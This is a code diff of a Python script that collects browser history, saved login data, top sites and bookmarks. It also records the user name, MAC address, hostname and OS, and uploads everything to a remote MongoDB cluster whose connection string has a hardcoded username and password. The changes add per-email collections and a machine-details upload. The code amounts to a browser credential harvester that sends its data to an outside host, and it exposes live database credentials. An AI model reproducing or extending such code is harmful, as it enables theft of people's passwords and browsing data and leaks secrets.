@@ -7,6 +7,8 @@ from pymongo import MongoClient
 import uuid
 import socket
 import platform
+import sys
+import datetime
 
 login_data = list()
 top_sites = list()
@@ -16,6 +18,8 @@ bookmarks = list()
 user_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
 host_name = socket.gethostname()
 user_os = platform.node()
+date = datetime.datetime.now()
+
 
 class Bookmarks:
     def __init__(self,date,name,url):
@@ -28,55 +32,63 @@ class MongoDB:
         client = MongoClient("mongodb+srv://benura:Benura123@clust1-tn0nm.mongodb.net/test?ssl=true&retryWrites=true&w=majority")
         print(client)
         self.client = client
-        self.createDatabaseCollections()
-
-    def createDatabaseCollections(self):
         db = self.client.save_password
-        history_collection = db.history
-        login_data_collection = db.login_data
-        top_sites_collection = db.top_sites
-        bookmarks_collection = db.bookmarks
-        self.history_collection = history_collection
-        self.login_data_collection = login_data_collection
-        self.top_sites_collection = top_sites_collection
-        self.bookmarks_collection = bookmarks_collection
+        self.db = db
+
+    def checkCollectionExists(self, email):
+        print(self.db.list_collection_names())
+        if(email in self.db.list_collection_names()):
+            return True
+        else:
+            self.createDatabaseCollection(email)
+            return False
+
+    def createDatabaseCollection(self,email):
+        self.user_collection = self.db[email]
 
     def updateHistory(self,history_array):
         history_document = {
-            "mac": user_mac,
-            "host_name": host_name,
-            "os": user_os,
+            "type": "history",
+            "date": date,
             "url": history_array
         }
-        print(self.history_collection.name)
-        self.history_collection.insert_one(history_document)
+        print(self.user_collection.name)
+        self.user_collection.insert_one(history_document)
 
     def updateTopSites(self, top_sites_array):
         top_sites_document = {
-            "mac": user_mac,
-            "host_name": host_name,
-            "os": user_os,
+            "type": "top_sites",
+            "date": date,
             "url": top_sites_array
         }
-        self.top_sites_collection.insert_one(top_sites_document)
+        self.user_collection.insert_one(top_sites_document)
 
     def updateLoginData(self, login_data_array):
         login_data_document = {
-            "mac": user_mac,
-            "host_name": host_name,
-            "os": user_os,
+            "type": "login_data",
+            "date": date,
             "login": login_data_array
         }
-        self.login_data_collection.insert_one(login_data_document)
+        self.user_collection.insert_one(login_data_document)
 
     def updateBookmarks(self, bookmarks_array):
         bookmarks_document = {
-            "mac": user_mac,
-            "host_name": host_name,
-            "os": user_os,
+            "type": "bookmarks",
+            "date": date,
             "bookmarks": bookmarks_array
         }
-        self.bookmarks_collection.insert_one(dict(bookmarks_document))
+        self.user_collection.insert_one(dict(bookmarks_document))
+
+    def updateMachineDetails(self):
+        machine_details = {
+            "type": "machine_details",
+            "date": date,
+            "user": user,
+            "mac": user_mac,
+            "host_name": host_name,
+            "os": user_os
+        }
+        self.user_collection.insert_one(machine_details)
 
 mongoDB = MongoDB()
 
@@ -209,10 +221,22 @@ def main():
                 except Error as e:
                     print(e)
                 finally:
-                    print("Updated!")
+                    try:
+                        mongoDB.updateMachineDetails()
+                    except:
+                        print("Error Updating Machine Details!")
+                    finally:
+                        print("Updated!")
     
 
 if __name__ == '__main__':
     user = getpass.getuser()
-    print(user)
-    main()
+    print("USER",user)
+    if(len(sys.argv) != 3):
+        print("Enter the Email and a Password you provided!")
+    else:
+        isInValid = mongoDB.checkCollectionExists(sys.argv[1])
+        if(not isInValid):
+            main()
+        else:
+            print('User Exists')
